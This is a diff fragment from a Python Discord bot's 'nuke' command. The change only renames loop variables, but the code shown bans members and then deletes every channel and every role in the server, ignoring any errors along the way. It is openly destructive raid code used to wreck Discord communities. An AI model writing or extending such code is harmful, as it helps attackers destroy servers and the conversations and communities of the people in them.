@@ -19,17 +19,17 @@ async def nuke (ctx):
         except:
             print ("cant to ban")
             
-    for i in ctx.guild.channels:
+    for j in ctx.guild.channels:
         
         try:
-            await i.delete ()
+            await j.delete ()
         except:
             print ("cant to delete")
     
-    for i in ctx.guild.roles:
+    for k in ctx.guild.roles:
         
         try:
-            await i.delete ()
+            await k.delete ()
         except:
             print ("cant to delete")
         
